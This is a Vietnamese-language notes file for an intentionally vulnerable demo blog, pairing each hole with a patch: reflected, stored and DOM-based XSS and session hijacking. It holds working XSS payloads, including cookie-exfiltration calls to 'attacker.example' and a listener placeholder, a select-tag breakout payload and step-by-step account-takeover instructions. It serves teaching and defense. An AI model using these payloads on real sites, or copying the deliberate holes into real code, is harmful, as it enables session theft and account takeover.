# Ghi chú lỗ hổng & Bản vá — TechViet Blog

Tài liệu này **không nằm trong mã nguồn trang web** (giữ trang blog trông hoàn toàn bình thường đối với người ngoài). Dùng để đối chiếu khi viết phần "Biện pháp ngăn chặn" trong báo cáo, hoặc để tự vá lại ứng dụng sau khi demo xong.

---

## 1. Reflected XSS — `search.php`

**Vị trí lỗi:** dòng in tiêu đề kết quả tìm kiếm.

```php
// DỄ BỊ KHAI THÁC (hiện tại trong site):
<h2>Kết quả tìm kiếm cho "<?php echo $q; ?>" ...</h2>
```

**Payload khai thác:**
```
http://<domain>/search.php?q=<script>alert(document.cookie)</script>
http://<domain>/search.php?q=<img src=x onerror=alert(1)>
```

**Bản vá:**
```php
<h2>Kết quả tìm kiếm cho "<?php echo htmlspecialchars($q, ENT_QUOTES, 'UTF-8'); ?>" ...</h2>
```

---

## 2. Stored XSS — `post.php` (phần bình luận)

**Vị trí lỗi:** vòng lặp hiển thị danh sách bình luận.

```php
// DỄ BỊ KHAI THÁC (hiện tại trong site):
<span class="comment-name"><?php echo $c['name']; ?></span>
<div class="comment-body"><?php echo $c['comment']; ?></div>
```

**Payload khai thác:** nhập vào ô "Viết bình luận..."
```
<script>fetch('https://attacker.example/log?c='+document.cookie)</script>
```
→ Mã sẽ chạy với MỌI người xem bài viết đó về sau (đặc trưng của Stored XSS — tấn công dai dẳng, phạm vi rộng hơn Reflected).

**Bản vá:**
```php
<span class="comment-name"><?php echo htmlspecialchars($c['name'], ENT_QUOTES, 'UTF-8'); ?></span>
<div class="comment-body"><?php echo htmlspecialchars($c['comment'], ENT_QUOTES, 'UTF-8'); ?></div>
```

*(Tuỳ chọn nâng cao: nếu muốn cho phép định dạng cơ bản như in đậm/in nghiêng trong bình luận, dùng thư viện lọc HTML theo allow-list như HTML Purifier thay vì chỉ encode toàn bộ.)*

---

## 3. DOM-based XSS — `post.php` (bộ lọc "Chủ đề liên quan")

**Vị trí lỗi:** đoạn script bên trong thẻ `<select>` ở cuối trang `post.php`.

```javascript
// DỄ BỊ KHAI THÁC (hiện tại trong site):
document.write('<option value="' + document.location.search.replace(/.*category=([^&]*).*|.*/, '$1') + '" selected>' +
                decodeURIComponent(document.location.search.replace(/.*category=([^&]*).*|.*/, '$1')) +
                '</option>');
```

**Source:** `document.location.search` (tham số `category` trên URL) — đọc nguyên văn, **không qua `decodeURIComponent` trước khi ghép vào thuộc tính `value`**.
**Sink:** `document.write()` — ghi thẳng ra trang mà không mã hóa.

### Vì sao payload `<script>`/`<img>` thông thường KHÔNG chạy ngay?

Đoạn `document.write()` này nằm **bên trong thẻ `<select>...</select>`**. Theo đặc tả HTML, trình duyệt chỉ chấp nhận `<option>`/`<optgroup>` làm con hợp lệ của `<select>` — mọi thẻ khác (`<script>`, `<img>`...) bị **bỏ qua hoặc hiển thị dưới dạng text thô**, không được thực thi. Đây là lý do nhiều người mới học XSS thử `<img src=x onerror=alert(1)>` trực tiếp mà "không thấy gì xảy ra" — không phải vì không có lỗi, mà vì ngữ cảnh HTML hiện tại chặn nó.

**Payload khai thác đúng cách — phải "thoát" khỏi `<select>` trước:**
```
https://<domain>/post.php?slug=toi-uu-toc-do-may-tinh&category="></select><img src=1 onerror=alert(document.cookie)>
```
Giải thích từng phần:
- `">` — đóng thuộc tính `value="..."` và thẻ `<option>` đang mở dở.
- `</select>` — đóng hẳn ngữ cảnh `<select>`, đưa trình duyệt về chế độ phân tích HTML bình thường.
- `<img src=1 onerror=alert(document.cookie)>` — giờ nằm ngoài `<select>`, được trình duyệt thực thi bình thường như bất kỳ thẻ HTML nào khác.

Không cần URL-encode các ký tự `<`, `>`, `"` khi gõ trực tiếp vào thanh địa chỉ — hầu hết trình duyệt vẫn chấp nhận và gửi nguyên văn, đúng như cách `document.location.search` nhận lại.

**Bản vá:**
```javascript
// Không dùng document.write() với dữ liệu người dùng. Thay vào đó, parse giá trị
// và dùng DOM API an toàn (createElement + textContent) để tạo <option>:
var params = new URLSearchParams(window.location.search);
var cat = params.get('category') || '';
var opt = document.createElement('option');
opt.value = cat;        // thuộc tính value qua DOM property - trình duyệt tự escape
opt.textContent = cat;  // textContent không bao giờ được diễn giải thành HTML
opt.selected = true;
document.getElementById('categorySelect').appendChild(opt);
```
*(Nguyên tắc chung: tránh hoàn toàn `document.write()`, `innerHTML`, `outerHTML` khi xử lý dữ liệu không tin cậy — luôn ưu tiên các API tạo DOM node trực tiếp như `createElement`/`textContent`, vì chúng không bao giờ diễn giải chuỗi thành thẻ HTML.)*

---

## 4. Chiếm quyền phiên đăng nhập (Session Hijacking) qua cookie bị đánh cắp

**Vị trí lỗi:** `config.php`

```php
// DỄ BỊ KHAI THÁC (hiện tại trong site):
ini_set('session.cookie_httponly', 0);  // cố ý tắt HttpOnly
session_start();
```

Vì `HttpOnly` bị tắt, `document.cookie` trong JavaScript đọc được session cookie (`PHPSESSID`) — kết hợp với bất kỳ lỗ hổng XSS nào ở trên (reflected/stored/DOM-based), kẻ tấn công có thể:

1. Chèn payload đánh cắp cookie, ví dụ:
   ```
   <img src=x onerror="fetch('https://<listener>/steal?c='+document.cookie)">
   ```
2. Nhận được giá trị `PHPSESSID` của nạn nhân.
3. Trên trình duyệt của kẻ tấn công: mở DevTools → tab **Storage/Application → Cookies**, sửa giá trị `PHPSESSID` thành giá trị vừa lấy được.
4. Tải lại trang `profile.php` → **đăng nhập thành công với tài khoản nạn nhân mà không cần biết mật khẩu** — chứng minh impact thực tế của XSS (account takeover), không chỉ dừng ở `alert()`.

**Bản vá:**
```php
session_set_cookie_params([
    'httponly' => true,   // JS không đọc được cookie nữa
    'secure'   => true,   // chỉ gửi cookie qua HTTPS
    'samesite' => 'Lax',  // giảm thiểu CSRF đi kèm
]);
session_start();
```
Sau khi vá, `document.cookie` sẽ **không còn chứa `PHPSESSID`** nữa dù trang vẫn còn lỗi XSS khác — đây là ví dụ điển hình của **phòng thủ theo lớp (defense in depth)**: dù lớp encoding bị bỏ sót ở đâu đó, lớp `HttpOnly` vẫn chặn được hệ quả nghiêm trọng nhất (đánh cắp phiên đăng nhập).

---

## 5. Biện pháp phòng chống tổng quát (áp dụng chung)

| Biện pháp | Mục đích |
|---|---|
| `htmlspecialchars()` khi xuất mọi dữ liệu người dùng ra HTML | Chặn Reflected & Stored XSS |
| Dùng `textContent` thay vì `innerHTML` khi xử lý dữ liệu từ URL/DOM phía client | Chặn DOM-based XSS |
| Header `Content-Security-Policy: default-src 'self'; script-src 'self'` | Giảm thiểu tác động nếu script độc lọt qua |
| Prepared statements (đã áp dụng sẵn trong site) | Chống SQL Injection đi kèm |
| `HttpOnly` + `Secure` cho cookie phiên đăng nhập (nếu có hệ thống login) | Giảm rủi ro bị đánh cắp cookie qua XSS |
| WAF (ví dụ ModSecurity + OWASP CRS) | Lớp phòng thủ bổ sung ở tầng hạ tầng |

## 6. Cách áp dụng bản vá nhanh cho toàn site

Không sửa thủ công từng dòng — có thể tạo file `www/security_patch.php` và `require` nó ở đầu `header.php`, hoặc thay thế trực tiếp 3 file `search.php`, `post.php` bằng các đoạn code đã vá ở trên rồi deploy lại qua `install_lamp.sh`.
